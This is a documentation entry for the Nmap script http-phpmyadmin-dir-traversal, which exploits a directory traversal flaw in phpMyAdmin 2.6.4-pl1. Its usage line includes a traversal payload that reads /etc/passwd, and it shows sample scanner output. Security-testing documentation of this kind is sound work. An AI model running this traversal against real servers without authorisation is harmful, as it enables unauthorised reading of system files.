---
title: "http-phpmyadmin-dir-traversal"
source: official
category: "Vuln"
categories:
  - "vuln"
  - "exploit"
shortDescription: "Exploits a directory traversal vulnerability in phpMyAdmin 2.6.4-pl1 (and\npossibly other versions) to retrieve remote files on the web server."
risk: intrusive
tags:
  - "vuln"
  - "exploit"
  - "portrule"
scriptTypes:
  - "portrule"
protocols: []
ports: []
usage: "nmap -p80 --script http-phpmyadmin-dir-traversal --script-args=\"dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'\" <host/ip>\nnmap -p80 --script http-phpmyadmin-dir-traversal <host/ip>"
outputPreview:
  - "PORT   STATE SERVICE"
  - "80/tcp open  http"
  - "| http-phpmyadmin-dir-traversal:"
  - "|   VULNERABLE:"
  - "|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion"
  - "|     State: VULNERABLE (Exploitable)"
author: "Nmap Project"
reference:
  label: "View Official Script Source"
  url: "https://svn.nmap.org/nmap/scripts/http-phpmyadmin-dir-traversal.nse"
documentationUrl: "https://nmap.org/nsedoc/scripts/http-phpmyadmin-dir-traversal.html"
---

Exploits a directory traversal vulnerability in phpMyAdmin 2.6.4-pl1 (and
possibly other versions) to retrieve remote files on the web server.
